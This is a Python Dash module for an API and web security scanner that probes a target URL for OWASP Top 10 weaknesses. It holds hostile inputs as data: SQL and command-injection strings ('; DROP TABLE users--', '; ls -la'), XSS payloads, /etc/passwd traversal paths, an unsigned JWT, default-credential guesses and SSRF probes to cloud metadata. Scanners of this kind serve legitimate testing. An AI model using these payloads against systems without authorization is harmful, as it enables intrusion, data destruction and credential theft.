"""
ui_api_assessment.py
API Security Assessment tab — OWASP API Top 10 scanner, auth tester, AI analysis.
"""
from __future__ import annotations

import json
import re
import threading
import time
import traceback
import uuid
from datetime import datetime
from typing import Any

import requests
from dash import callback, dcc, html, Input, Output, State, ALL
from dash.exceptions import PreventUpdate
import dash_bootstrap_components as dbc

# ── Local imports ─────────────────────────────────────────────────────────────
try:
    from llm_engine import call_llm
except ImportError:
    def call_llm(prompt: str, **kw) -> str:
        return "⚠️ LLM engine not available."

# ── In-memory result store ────────────────────────────────────────────────────
_RESULTS: dict[str, list] = {}   # scan_id → list of finding dicts
_STATUS:  dict[str, str]  = {}   # scan_id → human status string
_LOCK = threading.Lock()

# ── Severity colours ─────────────────────────────────────────────────────────
SEV_COLOR = {
    "Critical": "#ff2d55",
    "High":     "#ff6b35",
    "Medium":   "#ffd60a",
    "Low":      "#30d158",
    "Info":     "#636e72",
}

# ── Styles ────────────────────────────────────────────────────────────────────
DARK_BG   = "#0d0d0d"
CARD_BG   = "#111111"
BORDER    = "1px solid #1e1e1e"
LABEL     = {"color": "#8e9eb0", "fontSize": "11px", "fontWeight": "600",
             "textTransform": "uppercase", "letterSpacing": "0.5px",
             "marginBottom": "4px"}
INPUT_STY = {"background": "#161616", "border": "1px solid #2a2a2a",
             "color": "#e0e0e0", "fontSize": "12px", "borderRadius": "6px"}
BTN_SM    = {"fontSize": "12px", "fontWeight": "600", "borderRadius": "6px"}

# ── OWASP API Top 10 check definitions ───────────────────────────────────────
OWASP_CHECKS = [
    {"id": "api1",  "name": "BOLA / IDOR",               "desc": "Enumerate object IDs (±1, random UUIDs)"},
    {"id": "api2",  "name": "Broken Auth",                "desc": "No token, expired JWT, alg:none bypass"},
    {"id": "api3",  "name": "Excessive Data Exposure",    "desc": "Response field analysis for PII leakage"},
    {"id": "api4",  "name": "Rate Limiting",              "desc": "Flood endpoint — check for 429 / throttle"},
    {"id": "api5",  "name": "Broken Function-Level Auth", "desc": "Admin endpoints without role"},
    {"id": "api6",  "name": "Mass Assignment",            "desc": "Extra fields in POST/PUT body"},
    {"id": "api7",  "name": "Security Misconfiguration",  "desc": "CORS, debug headers, error verbosity"},
    {"id": "api8",  "name": "Injection",                  "desc": "SQL/command injection in params"},
    {"id": "api9",  "name": "Improper Asset Management",  "desc": "Old API versions (/v0, /v1, /api)"},
    {"id": "api10", "name": "Insufficient Logging",       "desc": "404 on non-existent resources → 200?"},
]

# ── OWASP Web Top 10 (2021) check definitions ─────────────────────────────────
OWASP_WEB_CHECKS = [
    {"id": "a01", "name": "Broken Access Control",             "desc": "Path traversal, forced browsing, IDOR"},
    {"id": "a02", "name": "Cryptographic Failures",            "desc": "HTTP (no TLS), weak headers, sensitive data in transit"},
    {"id": "a03", "name": "Injection (XSS/SQLi)",              "desc": "Reflected XSS, SQL injection in forms/params"},
    {"id": "a04", "name": "Insecure Design",                   "desc": "Default creds, debug pages, backup files"},
    {"id": "a05", "name": "Security Misconfiguration",         "desc": "Server banner, directory listing, error pages"},
    {"id": "a06", "name": "Vulnerable & Outdated Components",  "desc": "Server version headers, known-CVE fingerprinting"},
    {"id": "a07", "name": "Auth & Session Failures",           "desc": "Session fixation, weak cookies, no logout invalidation"},
    {"id": "a08", "name": "Software & Data Integrity",         "desc": "Missing SRI, no CSP, open redirects"},
    {"id": "a09", "name": "Logging & Monitoring Failures",     "desc": "Verbose error pages, no 4xx logging evidence"},
    {"id": "a10", "name": "SSRF",                              "desc": "URL parameter probes for internal resource fetching"},
]

# ── Scanning helpers ──────────────────────────────────────────────────────────

def _safe_get(url: str, headers: dict, timeout: int = 8, **kw) -> requests.Response | None:
    try:
        return requests.get(url, headers=headers, timeout=timeout, verify=False, allow_redirects=True, **kw)
    except Exception:
        return None


def _safe_post(url: str, headers: dict, data: Any, timeout: int = 8) -> requests.Response | None:
    try:
        return requests.post(url, headers=headers, json=data, timeout=timeout, verify=False)
    except Exception:
        return None


def _finding(check_id: str, name: str, severity: str, detail: str, evidence: str = "") -> dict:
    return {
        "id":       str(uuid.uuid4())[:8],
        "check":    check_id,
        "name":     name,
        "severity": severity,
        "detail":   detail,
        "evidence": evidence,
        "ts":       datetime.now().strftime("%H:%M:%S"),
    }


# ── Per-check scanners ────────────────────────────────────────────────────────

def _check_bola(base: str, headers: dict, endpoints: list) -> list:
    findings = []
    candidate_urls = [e.get("url", base) for e in endpoints if "{id}" in e.get("url", "")
                      or re.search(r"/\d+", e.get("url", ""))][:3]
    # If no templated endpoints found, try common patterns
    if not candidate_urls:
        candidate_urls = [f"{base.rstrip('/')}/user/1", f"{base.rstrip('/')}/api/item/1"]

    for url in candidate_urls:
        # Try adjacent IDs
        for probe_id in [1, 2, 999999, 0]:
            probe_url = re.sub(r"/\d+", f"/{probe_id}", url)
            r1 = _safe_get(probe_url, headers)
            r2 = _safe_get(probe_url.replace(f"/{probe_id}", "/2"), headers)
            if r1 and r2 and r1.status_code == 200 and r2.status_code == 200:
                try:
                    b1, b2 = r1.json(), r2.json()
                    if b1 != b2:
                        findings.append(_finding("api1", "BOLA / IDOR", "High",
                            f"Different objects returned for IDs 1 and 2 without ownership check",
                            f"GET {probe_url} → {r1.status_code}"))
                        break
                except Exception:
                    pass
    return findings


def _check_broken_auth(base: str, headers: dict, endpoints: list) -> list:
    findings = []
    protected = [e.get("url", "") for e in endpoints
                 if any(k in e.get("url", "").lower() for k in ["user", "account", "profile", "admin", "me"])]
    if not protected:
        protected = [f"{base.rstrip('/')}/api/user", f"{base.rstrip('/')}/api/profile"]

    for url in protected[:3]:
        # No auth
        r_noauth = _safe_get(url, {k: v for k, v in headers.items() if k.lower() != "authorization"})
        if r_noauth and r_noauth.status_code == 200:
            findings.append(_finding("api2", "Broken Authentication", "Critical",
                f"Endpoint accessible without any Authorization header",
                f"GET {url} → 200 (no auth)"))

        # JWT alg:none bypass
        alg_none_token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0."
        r_none = _safe_get(url, {**headers, "Authorization": f"Bearer {alg_none_token}"})
        if r_none and r_none.status_code == 200:
            findings.append(_finding("api2", "JWT alg:none Bypass", "Critical",
                "Server accepted a JWT with algorithm set to 'none' (unsigned token)",
                f"GET {url} → 200 (alg:none)"))

        # Expired/malformed token
        r_invalid = _safe_get(url, {**headers, "Authorization": "Bearer invalid.token.here"})
        if r_invalid and r_invalid.status_code == 200:
            findings.append(_finding("api2", "Invalid Token Accepted", "High",
                "Server returned 200 for a clearly malformed JWT",
                f"GET {url} → 200 (malformed token)"))

    return findings


def _check_data_exposure(base: str, headers: dict, endpoints: list) -> list:
    findings = []
    pii_keys = ["password", "passwd", "secret", "token", "ssn", "credit_card",
                "card_number", "cvv", "dob", "birth", "private_key", "api_key"]
    for ep in endpoints[:5]:
        url = ep.get("url", "")
        if not url:
            continue
        r = _safe_get(url, headers)
        if not r or r.status_code != 200:
            continue
        try:
            body = r.text.lower()
            hits = [k for k in pii_keys if k in body]
            if hits:
                findings.append(_finding("api3", "Excessive Data Exposure", "High",
                    f"Response may contain sensitive fields: {', '.join(hits)}",
                    f"GET {url} → PII keywords found"))
        except Exception:
            pass
    return findings


def _check_rate_limit(base: str, headers: dict, endpoints: list) -> list:
    findings = []
    url = (endpoints[0].get("url") if endpoints else None) or f"{base.rstrip('/')}/api"
    codes = []
    for _ in range(20):
        r = _safe_get(url, headers, timeout=3)
        if r:
            codes.append(r.status_code)
    throttled = any(c in (429, 503) for c in codes)
    if not throttled:
        findings.append(_finding("api4", "No Rate Limiting", "Medium",
            f"20 rapid requests to {url} — no 429 or throttling detected",
            f"Codes seen: {sorted(set(codes))}"))
    return findings


def _check_func_auth(base: str, headers: dict) -> list:
    findings = []
    admin_paths = ["/admin", "/api/admin", "/api/v1/admin", "/management",
                   "/actuator", "/debug", "/console", "/phpinfo.php",
                   "/swagger-ui.html", "/api-docs"]
    no_auth_hdrs = {k: v for k, v in headers.items() if k.lower() != "authorization"}
    for path in admin_paths:
        url = base.rstrip("/") + path
        r = _safe_get(url, no_auth_hdrs, timeout=5)
        if r and r.status_code in (200, 301, 302, 307):
            findings.append(_finding("api5", "Broken Function-Level Auth", "High",
                f"Admin/sensitive path accessible without authentication",
                f"GET {url} → {r.status_code}"))
    return findings


def _check_mass_assignment(base: str, headers: dict, endpoints: list) -> list:
    findings = []
    for ep in [e for e in endpoints if e.get("method", "GET").upper() in ("POST", "PUT")][:3]:
        url = ep.get("url", "")
        if not url:
            continue
        payload = {"__proto__": {"admin": True}, "role": "admin",
                   "isAdmin": True, "privileged": True, "id": 9999}
        r = _safe_post(url, headers, payload)
        if r and r.status_code in (200, 201):
            try:
                resp = r.json()
                if any(k in str(resp).lower() for k in ["admin", "role", "privileged"]):
                    findings.append(_finding("api6", "Mass Assignment", "High",
                        "Server reflected back unexpected privilege-related fields in response",
                        f"POST {url} → {r.status_code} with admin fields"))
            except Exception:
                pass
    return findings


def _check_misconfig(base: str, headers: dict) -> list:
    findings = []
    r = _safe_get(base, headers)
    if r:
        cors = r.headers.get("Access-Control-Allow-Origin", "")
        if cors == "*":
            findings.append(_finding("api7", "Permissive CORS", "Medium",
                "Access-Control-Allow-Origin: * allows any origin to read responses",
                f"Header: Access-Control-Allow-Origin: *"))
        security_headers = {
            "Strict-Transport-Security": "Missing HSTS header",
            "X-Content-Type-Options":    "Missing X-Content-Type-Options (MIME sniffing)",
            "X-Frame-Options":           "Missing X-Frame-Options (clickjacking risk)",
            "Content-Security-Policy":   "Missing Content-Security-Policy",
        }
        for hdr, msg in security_headers.items():
            if hdr not in r.headers:
                findings.append(_finding("api7", f"Security Misconfiguration", "Low",
                    msg, f"Missing header: {hdr}"))
        # Debug/verbose errors
        for path in ["/throw", "/error", "/api/error"]:
            re_ = _safe_get(base.rstrip("/") + path, headers, timeout=4)
            if re_ and re_.status_code in (500, 503):
                if any(k in re_.text.lower() for k in ["traceback", "stack trace", "exception", "at java."]):
                    findings.append(_finding("api7", "Verbose Error Disclosure", "Medium",
                        "Server returns stack traces in error responses",
                        f"GET {path} → stack trace in body"))
    return findings


def _check_injection(base: str, headers: dict, endpoints: list) -> list:
    findings = []
    payloads = ["' OR '1'='1", "'; DROP TABLE users--", "<script>alert(1)</script>",
                "$(sleep 5)", "; ls -la", "1 UNION SELECT null--"]
    for ep in endpoints[:3]:
        url = ep.get("url", "")
        if not url:
            continue
        for pl in payloads[:3]:
            probe = url + ("&" if "?" in url else "?") + f"q={requests.utils.quote(pl)}"
            r = _safe_get(probe, headers, timeout=5)
            if r and r.status_code == 200:
                body = r.text.lower()
                if any(k in body for k in ["sql syntax", "mysql_fetch", "ora-", "pg_query",
                                            "syntax error", "uncaught exception"]):
                    findings.append(_finding("api8", "SQL/Error Injection", "Critical",
                        f"Error message in response suggests injection vulnerability",
                        f"GET {probe} → DB error in body"))
                    break
    return findings


def _check_asset_mgmt(base: str, headers: dict) -> list:
    findings = []
    old_versions = ["/v0", "/v1", "/v2", "/api/v1", "/api/v2",
                    "/api/old", "/legacy", "/beta", "/test"]
    for path in old_versions:
        url = base.rstrip("/") + path
        r = _safe_get(url, headers, timeout=4)
        if r and r.status_code in (200, 301, 302):
            findings.append(_finding("api9", "Improper Asset Management", "Medium",
                f"Old or undocumented API version is accessible",
                f"GET {url} → {r.status_code}"))
    return findings


def _check_logging(base: str, headers: dict) -> list:
    findings = []
    ghost_paths = [f"/api/user/{uuid.uuid4()}", f"/resource/{uuid.uuid4()}"]
    for path in ghost_paths:
        url = base.rstrip("/") + path
        r = _safe_get(url, headers, timeout=5)
        if r and r.status_code == 200:
            findings.append(_finding("api10", "Insufficient Logging", "Low",
                "Non-existent resource returned 200 — server may not log/block invalid access",
                f"GET {url} → 200 (expected 404)"))
    return findings


# ── OWASP Web Top 10 scanner functions ───────────────────────────────────────

def _web_a01_access_control(base: str, headers: dict) -> list:
    """A01: Broken Access Control — path traversal, forced browsing."""
    findings = []
    traversal_paths = [
        "/etc/passwd", "/../etc/passwd", "/..%2Fetc%2Fpasswd",
        "/WEB-INF/web.xml", "/WEB-INF/web.xml%00",
        "/admin/", "/backup/", "/hidden/", "/internal/",
    ]
    for path in traversal_paths:
        url = base.rstrip("/") + path
        r = _safe_get(url, headers, timeout=5)
        if r and r.status_code == 200 and len(r.text) > 20:
            if any(k in r.text.lower() for k in ["root:", "daemon:", "<web-app", "admin"]):
                findings.append(_finding("a01", "Path Traversal / Forced Browse", "Critical",
                    f"Sensitive path returned 200 with readable content",
                    f"GET {url} → {r.status_code} ({len(r.text)} bytes)"))
    return findings


def _web_a02_crypto(base: str, headers: dict) -> list:
    """A02: Cryptographic Failures."""
    findings = []
    if base.startswith("http://"):
        findings.append(_finding("a02", "Unencrypted HTTP", "High",
            "Application is served over plain HTTP, not HTTPS",
            f"URL: {base}"))
    r = _safe_get(base, headers)
    if r:
        body = r.text.lower()
        sensitive = ["password", "passwd", "secret", "credit_card", "ssn", "api_key"]
        for kw in sensitive:
            if kw in body and base.startswith("http://"):
                findings.append(_finding("a02", "Sensitive Data Over HTTP", "High",
                    f"Keyword '{kw}' found in plaintext HTTP response body",
                    f"GET {base} → keyword in body"))
                break
    return findings


def _web_a03_injection(base: str, headers: dict, endpoints: list) -> list:
    """A03: XSS and SQL Injection."""
    findings = []
    xss_payloads  = ["<script>alert(1)</script>", "\"'><svg onload=alert(1)>", "javascript:alert(1)"]
    sqli_payloads = ["'", "' OR '1'='1", "1 UNION SELECT null,null--", "'; WAITFOR DELAY '0:0:3'--"]
    error_sigs    = ["sql syntax", "mysql_fetch", "ora-0", "sqlite3", "pg_query",
                     "unclosed quotation", "syntax error near"]

    probe_urls = [e.get("url", "") for e in endpoints if "?" in e.get("url", "")][:4]
    if not probe_urls:
        probe_urls = [base.rstrip("/") + "/search?q=test",
                      base.rstrip("/") + "/index.php?id=1"]

    for url in probe_urls:
        base_url, _, qs = url.partition("?")
        # XSS
        for pl in xss_payloads[:2]:
            probe = f"{base_url}?{qs}&xss={requests.utils.quote(pl)}"
            r = _safe_get(probe, headers, timeout=5)
            if r and pl.lower() in r.text.lower():
                findings.append(_finding("a03", "Reflected XSS", "High",
                    "Injected script reflected verbatim in HTML response",
                    f"GET {probe} → payload reflected"))
                break
        # SQLi
        for pl in sqli_payloads[:2]:
            probe = f"{base_url}?{qs}&id={requests.utils.quote(pl)}"
            r = _safe_get(probe, headers, timeout=6)
            if r and any(sig in r.text.lower() for sig in error_sigs):
                findings.append(_finding("a03", "SQL Injection", "Critical",
                    "Database error message in response suggests SQL injection",
                    f"GET {probe} → DB error"))
                break
    return findings


def _web_a04_insecure_design(base: str, headers: dict) -> list:
    """A04: Insecure Design — default creds, backup files, debug pages."""
    findings = []
    interesting = [
        ("/robots.txt",      ["disallow", "admin", "backup", "private"]),
        ("/.env",            ["db_password", "secret", "api_key", "password"]),
        ("/config.php.bak",  ["<?php", "password", "database"]),
        ("/.git/HEAD",       ["ref:", "master", "main"]),
        ("/backup.zip",      ["pk"]),
        ("/phpinfo.php",     ["php version", "system"]),
        ("/test.php",        ["<?php", "test"]),
        ("/server-status",   ["apache", "server version"]),
    ]
    for path, sigs in interesting:
        url = base.rstrip("/") + path
        r = _safe_get(url, headers, timeout=5)
        if r and r.status_code == 200:
            body_lower = r.text.lower()
            if any(s in body_lower for s in sigs):
                findings.append(_finding("a04", f"Insecure Design: {path}", "High",
                    f"Sensitive file/page accessible — may expose credentials or infrastructure detail",
                    f"GET {url} → 200 with matching content"))
    return findings


def _web_a05_misconfig(base: str, headers: dict) -> list:
    """A05: Security Misconfiguration — server banner, directory listing."""
    findings = []
    r = _safe_get(base, headers)
    if r:
        server = r.headers.get("Server", "")
        if server:
            findings.append(_finding("a05", "Server Version Disclosed", "Low",
                f"Server header reveals technology version: {server}",
                f"Header: Server: {server}"))
        powered = r.headers.get("X-Powered-By", "")
        if powered:
            findings.append(_finding("a05", "Technology Stack Disclosed", "Low",
                f"X-Powered-By reveals backend: {powered}",
                f"Header: X-Powered-By: {powered}"))
    # Directory listing
    for path in ["/uploads/", "/files/", "/static/", "/images/", "/backup/"]:
        url = base.rstrip("/") + path
        r2 = _safe_get(url, headers, timeout=4)
        if r2 and r2.status_code == 200 and "index of" in r2.text.lower():
            findings.append(_finding("a05", "Directory Listing Enabled", "Medium",
                f"{path} exposes directory listing",
                f"GET {url} → 'Index of' in body"))
    return findings


def _web_a06_components(base: str, headers: dict) -> list:
    """A06: Vulnerable & Outdated Components."""
    findings = []
    r = _safe_get(base, headers)
    if not r:
        return findings
    server = r.headers.get("Server", "").lower()
    powered = r.headers.get("X-Powered-By", "").lower()
    combined = server + " " + powered + " " + r.text[:500].lower()

    old_versions = [
        ("apache/2.2",      "Apache 2.2 — EOL, CVE-2017-7679 and others"),
        ("apache/2.4.49",   "Apache 2.4.49 — CVE-2021-41773 Path Traversal (CVSS 9.8)"),
        ("apache/2.4.50",   "Apache 2.4.50 — CVE-2021-42013 Path Traversal (CVSS 9.8)"),
        ("nginx/1.14",      "Nginx 1.14 — EOL version with known vulns"),
        ("openssl/1.0",     "OpenSSL 1.0.x — EOL, Heartbleed era"),
        ("php/5",           "PHP 5.x — long EOL, numerous critical CVEs"),
        ("php/7.0",         "PHP 7.0 — EOL, known RCE vulnerabilities"),
        ("wordpress/4",     "WordPress 4.x — EOL"),
        ("joomla! 3",       "Joomla 3.x — EOL"),
        ("iis/6",           "IIS 6.0 — EOL, CVE-2017-7269 (EternalBlue IIS)"),
        ("tomcat/6",        "Tomcat 6 — EOL, known RCE vulnerabilities"),
    ]
    for sig, desc in old_versions:
        if sig in combined:
            findings.append(_finding("a06", f"Outdated Component: {sig.split('/')[0].title()}",
                "High", desc, f"Detected in: Server/X-Powered-By header or page body"))
    return findings


def _web_a07_auth_session(base: str, headers: dict) -> list:
    """A07: Identification and Authentication Failures."""
    findings = []
    r = _safe_get(base, headers)
    if r:
        for cookie in r.cookies:
            flags = []
            if not cookie.secure:
                flags.append("missing Secure flag")
            if not cookie.has_nonstandard_attr("HttpOnly"):
                flags.append("missing HttpOnly flag")
            if not cookie.has_nonstandard_attr("SameSite"):
                flags.append("missing SameSite attribute")
            if flags:
                findings.append(_finding("a07", "Insecure Session Cookie", "Medium",
                    f"Cookie '{cookie.name}': {', '.join(flags)}",
                    f"Set-Cookie: {cookie.name}=... ({'; '.join(flags)})"))
    # Default credentials
    login_paths = ["/login", "/admin", "/wp-admin", "/admin/login.php"]
    default_creds = [("admin", "admin"), ("admin", "password"), ("admin", ""),
                     ("administrator", "administrator"), ("root", "root")]
    for lpath in login_paths[:2]:
        url = base.rstrip("/") + lpath
        for uname, pw in default_creds[:3]:
            r2 = _safe_post(url, headers,
                            {"username": uname, "password": pw,
                             "user": uname, "pass": pw})
            if r2 and r2.status_code in (200, 302):
                body = r2.text.lower()
                if any(k in body for k in ["dashboard", "welcome", "logout", "signed in"]):
                    findings.append(_finding("a07", "Default Credentials Accepted", "Critical",
                        f"Login succeeded with default credentials {uname}:{pw}",
                        f"POST {url} → {r2.status_code} (auth success indicators in body)"))
                    break
    return findings


def _web_a08_integrity(base: str, headers: dict) -> list:
    """A08: Software and Data Integrity Failures — CSP, SRI, open redirects."""
    findings = []
    r = _safe_get(base, headers)
    if r:
        csp = r.headers.get("Content-Security-Policy", "")
        if not csp:
            findings.append(_finding("a08", "Missing Content-Security-Policy", "Medium",
                "No CSP header — XSS and data injection attacks are not mitigated",
                "Header: Content-Security-Policy: (missing)"))
        elif "unsafe-inline" in csp or "unsafe-eval" in csp:
            findings.append(_finding("a08", "Weak Content-Security-Policy", "Medium",
                "CSP uses 'unsafe-inline' or 'unsafe-eval' which undermines XSS protection",
                f"CSP: {csp[:120]}"))
    # Open redirect
    for redir_param in ["?redirect=", "?next=", "?url=", "?goto=", "?return="]:
        url = base.rstrip("/") + redir_param + "http://evil.example.com"
        r2 = _safe_get(url, headers, timeout=4, allow_redirects=False)
        if r2 and r2.status_code in (301, 302, 307, 308):
            loc = r2.headers.get("Location", "")
            if "evil.example.com" in loc:
                findings.append(_finding("a08", "Open Redirect", "Medium",
                    f"Server redirects to arbitrary external URLs via {redir_param.strip('?=')}",
                    f"GET {url} → {r2.status_code} Location: {loc}"))
    return findings


def _web_a09_logging(base: str, headers: dict) -> list:
    """A09: Security Logging and Monitoring Failures."""
    findings = []
    # Check if error pages are verbose
    for path in ["/nonexistent_page_xyz", "/error", "/crash"]:
        url = base.rstrip("/") + path
        r = _safe_get(url, headers, timeout=5)
        if r and r.status_code in (404, 500):
            body = r.text.lower()
            if any(k in body for k in ["exception", "traceback", "stack trace",
                                        "line ", "at java.", "file \""]):
                findings.append(_finding("a09", "Verbose Error Pages", "Medium",
                    "Error pages reveal stack traces or internal file paths",
                    f"GET {url} → {r.status_code} with stack trace"))
                break
    return findings


def _web_a10_ssrf(base: str, headers: dict) -> list:
    """A10: Server-Side Request Forgery."""
    findings = []
    ssrf_probes = [
        "http://169.254.169.254/latest/meta-data/",   # AWS metadata
        "http://127.0.0.1:22",
        "http://localhost/admin",
        "http://192.168.1.1",
    ]
    url_params = ["?url=", "?path=", "?src=", "?href=", "?uri=", "?fetch="]
    for param in url_params:
        for probe in ssrf_probes[:2]:
            test_url = base.rstrip("/") + param + requests.utils.quote(probe)
            r = _safe_get(test_url, headers, timeout=5)
            if r and r.status_code == 200 and len(r.text) > 50:
                if any(k in r.text.lower() for k in ["ami-id", "instance-id", "ssh-",
                                                       "root:", "<!doctype"]):
                    findings.append(_finding("a10", "SSRF Vulnerability", "Critical",
                        f"Server fetched internal resource in response to {param} parameter",
                        f"GET {test_url} → 200 with internal content"))
                    break
    return findings


# ── Endpoint discovery from spec or crawl ────────────────────────────────────

def _parse_openapi(spec_text: str, base: str) -> list:
    try:
        spec = json.loads(spec_text)
    except Exception:
        try:
            import yaml
            spec = yaml.safe_load(spec_text)
        except Exception:
            return []
    endpoints = []
    paths = spec.get("paths", {})
    servers = spec.get("servers", [])
    server_url = servers[0].get("url", base) if servers else base
    for path, methods in paths.items():
        for method, meta in methods.items():
            if method.lower() in ("get", "post", "put", "patch", "delete"):
                endpoints.append({
                    "url":    server_url.rstrip("/") + path,
                    "method": method.upper(),
                    "name":   meta.get("summary", path),
                })
    return endpoints


def _crawl_endpoints(base: str, headers: dict) -> list:
    """Crawl base URL for endpoints: parse HTML hrefs, JS strings, and probe common paths."""
    from urllib.parse import urljoin, urlparse
    discovered = set()
    base_parsed = urlparse(base)

    # 1. Probe common API/web paths relative to the base URL
    common = [
        "/api", "/api/v1", "/api/v2", "/swagger.json", "/openapi.json",
        "/api-docs", "/v1", "/v2", "/health", "/status",
        "/login", "/api/login", "/api/auth", "/users", "/api/users",
        "login", "login.php", "index.php", "register.php", "search.php",
    ]
    for path in common:
        url = base.rstrip("/") + "/" + path.lstrip("/") if not path.startswith("/") else base.rstrip("/") + path
        r = _safe_get(url, headers, timeout=4)
        if r and r.status_code in (200, 301, 302):
            discovered.add(url)

    # 2. Harvest href links from the base page and one level deep
    r_home = _safe_get(base, headers, timeout=6)
    if r_home:
        for m in re.finditer(r'href=["\']([^"\'>]+)["\']', r_home.text, re.IGNORECASE):
            href = m.group(1).strip()
            if href.startswith(("#", "mailto:", "javascript:")):
                continue
            full = urljoin(base, href)
            # Only keep URLs on the same host
            if urlparse(full).netloc == base_parsed.netloc:
                discovered.add(full.split("?")[0])  # strip query for dedup
        # Also find URLs in JS strings
        for m in re.finditer(r'["\']((?:/|https?://)[^"\' <>\\]{4,80})["\']', r_home.text):
            href = m.group(1)
            full = urljoin(base, href)
            if urlparse(full).netloc == base_parsed.netloc:
                discovered.add(full.split("?")[0])

    return [{"url": u, "method": "GET", "name": u} for u in sorted(discovered)]


# ── Main scan runner ──────────────────────────────────────────────────────────

def _run_scan(scan_id: str, base: str, headers: dict,
              spec_text: str, selected_checks: list):
    with _LOCK:
        _STATUS[scan_id] = "🔍 Discovering endpoints…"
        _RESULTS[scan_id] = []

    try:
        if spec_text:
            endpoints = _parse_openapi(spec_text, base)
        else:
            endpoints = _crawl_endpoints(base, headers)

        with _LOCK:
            ep_msg = f"{len(endpoints)} page links discovered" if endpoints else "No API endpoints auto-discovered"
            _STATUS[scan_id] = f"📡 {ep_msg} — running {len(selected_checks)} checks…"

        all_findings: list = []

        check_map = {
            # OWASP API Top 10
            "api1":  lambda: _check_bola(base, headers, endpoints),
            "api2":  lambda: _check_broken_auth(base, headers, endpoints),
            "api3":  lambda: _check_data_exposure(base, headers, endpoints),
            "api4":  lambda: _check_rate_limit(base, headers, endpoints),
            "api5":  lambda: _check_func_auth(base, headers),
            "api6":  lambda: _check_mass_assignment(base, headers, endpoints),
            "api7":  lambda: _check_misconfig(base, headers),
            "api8":  lambda: _check_injection(base, headers, endpoints),
            "api9":  lambda: _check_asset_mgmt(base, headers),
            "api10": lambda: _check_logging(base, headers),
            # OWASP Web Top 10
            "a01":   lambda: _web_a01_access_control(base, headers),
            "a02":   lambda: _web_a02_crypto(base, headers),
            "a03":   lambda: _web_a03_injection(base, headers, endpoints),
            "a04":   lambda: _web_a04_insecure_design(base, headers),
            "a05":   lambda: _web_a05_misconfig(base, headers),
            "a06":   lambda: _web_a06_components(base, headers),
            "a07":   lambda: _web_a07_auth_session(base, headers),
            "a08":   lambda: _web_a08_integrity(base, headers),
            "a09":   lambda: _web_a09_logging(base, headers),
            "a10":   lambda: _web_a10_ssrf(base, headers),
        }

        for check_id, fn in check_map.items():
            if check_id not in selected_checks:
                continue
            try:
                results = fn()
                all_findings.extend(results)
                with _LOCK:
                    _RESULTS[scan_id] = list(all_findings)
                    _STATUS[scan_id] = f"✅ {check_id.upper()} done — {len(all_findings)} findings so far…"
            except Exception as e:
                with _LOCK:
                    _STATUS[scan_id] = f"⚠️ {check_id} error: {e}"

        sev_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}
        all_findings.sort(key=lambda f: sev_order.get(f["severity"], 5))

        with _LOCK:
            _RESULTS[scan_id] = all_findings
            crits = sum(1 for f in all_findings if f["severity"] == "Critical")
            highs = sum(1 for f in all_findings if f["severity"] == "High")
            _STATUS[scan_id] = (
                f"✅ Scan complete — {len(all_findings)} findings "
                f"({crits} Critical, {highs} High)"
            )
    except Exception:
        with _LOCK:
            _STATUS[scan_id] = f"❌ Scan failed: {traceback.format_exc(limit=2)}"


# ── Layout helpers ────────────────────────────────────────────────────────────

def _card(*children, style=None):
    base_s = {"background": CARD_BG, "border": BORDER, "borderRadius": "10px",
               "padding": "16px", "marginBottom": "12px"}
    if style:
        base_s.update(style)
    return html.Div(children, style=base_s)


def _label(text):
    return html.Div(text, style=LABEL)


def _severity_badge(sev: str):
    color = SEV_COLOR.get(sev, "#636e72")
    return html.Span(sev, style={
        "background": color, "color": "#000" if sev in ("Medium", "Low") else "#fff",
        "fontSize": "10px", "fontWeight": "700", "borderRadius": "4px",
        "padding": "2px 6px", "marginRight": "6px",
    })


# ── Main layout ───────────────────────────────────────────────────────────────

def layout():
    checks_options = [{"label": f"{c['id'].upper()}: {c['name']}", "value": c["id"]}
                      for c in OWASP_CHECKS]
    all_check_ids = [c["id"] for c in OWASP_CHECKS]

    return html.Div([
        dcc.Store(id="api-scan-id"),
        dcc.Store(id="api-selected-finding"),
        dcc.Store(id="api-artifacts", data=[]),       # tracks test artefacts for cleanup
        dcc.Store(id="api-phase-outputs", data={}),   # cmd outputs per phase
        dcc.Interval(id="api-poll", interval=2000, disabled=True),

        # Header
        html.Div([
            html.H4("🔌 API & Web Pentest Lifecycle",
                    style={"color": "#e0e0e0", "fontWeight": "700", "margin": "0"}),
            html.Div("Recon · Exploit · Lateral Movement · PrivEsc · Post-Exploitation · Cleanup · Report",
                     style={"color": "#636e72", "fontSize": "13px"}),
        ], style={"marginBottom": "16px"}),

        # Phase tabs
        dbc.Tabs(id="api-phase-tabs", active_tab="phase-recon", style={"marginBottom": "16px"}, children=[
            dbc.Tab(label="🔍 Recon & Scan",       tab_id="phase-recon"),
            dbc.Tab(label="💥 Exploit",             tab_id="phase-exploit"),
            dbc.Tab(label="🌐 Lateral Movement",    tab_id="phase-lateral"),
            dbc.Tab(label="⬆ Privilege Escalation", tab_id="phase-privesc"),
            dbc.Tab(label="🕵 Post-Exploitation",   tab_id="phase-postex"),
            dbc.Tab(label="🧹 Cleanup",             tab_id="phase-cleanup"),
            dbc.Tab(label="📄 Report",              tab_id="phase-report"),
        ]),

        # Phase content (switches based on tab)
        html.Div(id="api-phase-content"),

    ], style={"background": DARK_BG, "minHeight": "100vh", "padding": "24px"})


# ── Callbacks ─────────────────────────────────────────────────────────────────

@callback(
    Output("api-checks", "value"),
    Input("api-checks-all",  "n_clicks"),
    Input("api-checks-none", "n_clicks"),
    prevent_initial_call=True,
)
def toggle_checks(all_n, none_n):
    from dash import ctx
    if ctx.triggered_id == "api-checks-all":
        return [c["id"] for c in OWASP_CHECKS]
    return []


@callback(
    Output("web-checks", "value"),
    Input("web-checks-all",  "n_clicks"),
    Input("web-checks-none", "n_clicks"),
    prevent_initial_call=True,
)
def toggle_web_checks(all_n, none_n):
    from dash import ctx
    if ctx.triggered_id == "web-checks-all":
        return [c["id"] for c in OWASP_WEB_CHECKS]
    return []


@callback(
    Output("api-scan-id",  "data"),
    Output("api-status",   "children"),
    Output("api-poll",     "disabled"),
    Input("api-run-btn",   "n_clicks"),
    State("api-base-url",       "value"),
    State("api-auth-header",    "value"),
    State("api-extra-headers",  "value"),
    State("api-spec-input",     "value"),
    State("api-checks",         "value"),
    State("web-checks",         "value"),
    prevent_initial_call=True,
)
def start_scan(n, base_url, auth_hdr, extra_hdrs, spec_text, api_checks, web_checks):
    if not n:
        raise PreventUpdate
    if not base_url:
